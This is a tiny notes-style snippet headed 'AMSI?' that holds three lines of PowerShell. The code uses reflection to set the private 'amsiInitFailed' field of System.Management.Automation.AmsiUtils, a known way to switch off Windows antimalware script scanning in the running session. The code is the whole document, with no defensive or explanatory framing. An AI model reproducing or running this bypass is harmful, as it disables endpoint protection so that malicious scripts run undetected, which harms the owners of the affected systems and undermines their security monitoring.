## AMSI?

```powershell
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$field = $amsi.GetField('amsiInitFailed','NonPublic,Static')
$field.SetValue($null,$true)
```